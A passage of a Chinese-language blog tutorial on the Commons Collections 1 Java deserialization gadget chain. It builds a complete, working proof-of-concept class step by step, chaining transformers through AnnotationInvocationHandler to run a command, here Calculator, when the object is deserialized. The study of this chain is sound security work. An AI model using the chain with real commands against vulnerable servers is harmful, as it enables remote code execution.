+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142036218.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142036218.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142036218.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142036218.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142036218.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142036218.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>接着找一个<code>setValue()</code>方法的调用，在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类中，找到了如下方法</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142044567.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142044567.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142044567.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142044567.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142044567.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142044567.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里调用了<code>setValue()</code>方法，并且还在<code>readObject()</code>方法中，继续构造<code>poc</code></p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">});</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transformedMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Constructor</span><span class="w"> </span><span class="n">annotationInvocationhandleconstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">annotationInvocationhandleconstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">annotationInvocationhandleconstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">transformedMap</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这里存在两个问题
+第一个问题是<code>Runtime</code>没有实现<code>Seriablable</code>接口，无法参与序列化过程
+利用反射来解决，这里再利用一个<code>ChainedTransformer.transform</code>方法</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142055839.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142055839.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142055839.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142055839.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142055839.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142055839.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>简单来说就是上一个执行<code>transform</code>方法返回的结果作为下一个执行<code>transform</code>方法输入</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">})</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>还有一个问题，无法控制<code>setValue()</code>里面的参数值</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142058315.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142058315.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142058315.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142058315.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142058315.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142058315.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里利用<code>org.apache.commons.collections.functors.ConstantTransformer</code>的<code>transform()</code>方法，无论传入什么，都会返回固定的值</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142059785.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142059785.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142059785.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142059785.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142059785.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142059785.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>所以完善一下上面的<code>poc</code></p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">})</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>于是完整的<code>poc</code>如下</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example.CommonsCollections</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CommonsCollection1</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">})</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">chainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w">  </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">});</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transformedMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">chainedTransformer</span><span class="p">);</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">AnnotationInvocationHandlerConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationInvocationHandlerConstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AnnotationInvocationHandlerConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">transformedMap</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
